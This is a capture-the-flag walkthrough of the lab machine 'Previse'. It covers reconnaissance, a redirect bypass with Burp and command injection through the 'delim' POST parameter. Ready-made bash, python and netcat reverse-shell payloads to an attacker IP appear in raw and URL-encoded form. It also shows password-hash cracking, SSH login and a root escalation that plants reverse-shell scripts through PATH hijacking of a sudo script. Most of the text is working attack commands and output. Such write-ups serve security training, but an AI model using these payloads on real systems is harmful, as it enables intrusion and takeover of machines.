# Previse

## Ifconfig

```
inet 10.10.14.46 destination 10.10.14.46
inet6 fe80::c5a7:fe18:4b74:a136
```

## Nmap

> sudo nmap -sC -sV -A 10.10.11.104 | tee [nmap.log](./nmap.log)

## Gobuster

> gobuster dir -u 10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x "xml,html,json,js,php,css" -t 100 2> /dev/null | tee [gobuster.log](./gobuster.log)

*lowercase-2.3-medium has big directory data, interrupt the process if target found*

*-t can be ignore (default use 10 threads)*

=> Found nav.php can be viewed

*After view nav.php page source, we found file_logs.php not listed in gobuster*

## Nikto

> nikto -h 10.10.11.104 | tee [nikto.log](./nikto.log)

## [Burpsuite](https://portswigger.net/burp/releases/professional-community-2021-8-4?requestededition=community) proxy tools

Tools can be used on burpsuite bulit-in browser or browser with *localhost:port* manual proxy

### Turn on intercept to bypass redirect 

- Right click `Do intercept > response to this request`

- Forward it and replace response `301`or`302`(*redirect*) with `200`(*OK*)

- Forward again and it will load to the target page

### Goto the [accounts.php](./site/backup/accounts.php) and add an new account

Whatever username and password

```
username: admin123
password: admin123
```

And then use it login as a user

### Get the [log data](./site/out.log) from [file_logs.php](./site/backup/file_logs.php)

### Get [backup](./site/backup) from [files.php](./site/backup/files.php)

[Config.php](./site/backup/config.php)

MySQL account

```
username: root
password: mySQL_p@ssw0rd!:)
```

[logs.php](./site/backup/logs.php)

=> Found it use python as an output process, not pure php

=> Inject code by `$_POST['delim']` in exec funciton 

### Use intercept to append inject code before POST it

- Append target is `delim=comma`

- Make sure convert to URL-encode format

- The [bash approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

*Origin*

> delim=comma&/bin/bash -c 'bash -i &> /dev/tcp/10.10.14.46/*port* 0>&1'

*Convert*

> delim=comma%26%2Fbin%2Fbash%20-c%20%27bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F10.10.14.46%2F*port*%200%3E%261%27

- The [python approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

*Origin*

> delim=comma&python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.46",*port*));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

*Convert*

> delim=comma%26python%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.14.46%22%2C*port*%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27

- The [netcat approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional) (*Ensure victim has netcat to use*)

*Origin*

> delim=comma&nc 10.10.14.46 *port* -e /bin/bash

*Convert*

> delim=%26nc%2010.10.14.46%20*port*%20-e%20%2Fbin%2Fbash

### Use nc to listen target port

> nc -lvnp *port*

> whoami

```
www-data
```

> id

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Login Mysql

### Open an new shell for mysql displaying output

> script -qc /bin/bash /dev/null

*Make it can work with xterm (optional)*

> export TERM=xterm

### Login with root account

> mysql -u root -p

> mySQL_p@ssw0rd!:)

```
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 102
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

> show databases;

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

> use previse;

```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

> show tables;

```
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)
```

> select * from accounts;

```
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | admin123 | $1$🧂llol$G3KunFyMrVvsqYP1JpRi70 | 2021-10-09 21:09:02 |
|  3 | admin    | $1$🧂llol$uXqzPW6SXUONt.AIOBqLy. | 2021-10-09 22:13:19 |
|  4 | dildo5   | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2021-10-10 01:24:22 |
|  5 | test123  | $1$🧂llol$sP8qi2I.K6urjPuzdGizl1 | 2021-10-10 03:53:42 |
+----+----------+------------------------------------+---------------------+
5 rows in set (0.01 sec)
```

### Select m4lwhere password and paste it on [txt file](./site/hash.txt)

- [rockyou.txt](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz) need to download and unwrap it

- After crack tools running, the encryption for this hash is `md5crypt-long`

> hashcat -a 0 -m 500 [hash.txt](./site/hash.txt) /usr/share/wordlists/rockyou.txt -o [hash_result.txt](./site/hash_result.txt)

or

> john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt [hash.txt](./site/hash.txt)

> john --show [hash.txt](./site/hash.txt)

```
?:ilovecody112235!
```

```
username: m4lwhere
password: ilovecody112235!
```

## SSH Login

> ssh m4lwhere@10.10.11.104

```
user.txt
fc7db7e7c80782e5d594581266cbbb64
```

> sudo -l

```
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

> cat /opt/scripts/[access_backup.sh](./ssh/access_backup.sh)

### Create a fake executable file related to [access_backup.sh](./ssh/access_backup.sh)

- There are gzip and date used in this shell

- Only need one to change to pwn the root

- Move to m4lwhere home

- Gzip approach

> echo "bash -c 'bash -i &> /dev/tcp/10.10.14.46/*port* 0<&1'" > gzip

> chmod +x gzip

- Data approach

> echo "bash -c 'bash -i &> /dev/tcp/10.10.14.46/*port* 0<&1'" > date

> chmod +x date

- Finally add PATH and run

> export PATH=$(pwd):$PATH

> sudo /opt/scripts/[access_backup.sh](./ssh/access_backup.sh)

> whoami&&id

```
root
uid=0(root) gid=0(root) groups=0(root)
```

> cat /root/root.txt

```
root.txt
377a03e045513ee63458f3ca5ef64657
```

- If use `/bash/bin -p > gzip/date` to run sudo, it will no response at command input

*Another approach (not recommand becuz no interactive, and it's temporary root privilege - euid)*

> vim gzip/date

```
cp /bin/bash $(pwd)/pwn
chmod u+s pwn
```
> ./pwn -p

```
pwn-4.4#
```

> whoami&&id

```
root
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere)
```
